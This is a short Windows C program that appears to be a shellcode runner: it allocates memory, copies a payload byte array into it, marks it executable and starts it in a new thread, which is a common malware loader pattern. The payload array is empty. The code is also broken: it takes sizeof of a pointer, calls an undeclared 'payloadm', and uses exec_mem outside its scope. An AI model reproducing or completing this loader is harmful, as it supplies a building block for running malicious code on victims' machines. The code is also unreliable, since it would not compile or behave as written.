#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

BOOL Unlock(unsigned char *payload, DWORD old_protect)
{
    unsigned int payload_len = sizeof(payload) / sizeof(char);
    void *exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(exec_mem, payload, payload_len);

    return (VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &old_protect));
}

int main(int ac, char **argv)
{
    HANDLE th = NULL;
    unsigned char payload[] = {};

    if (Unlock(payloadm, 0) != 0)
    {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return (0);
}
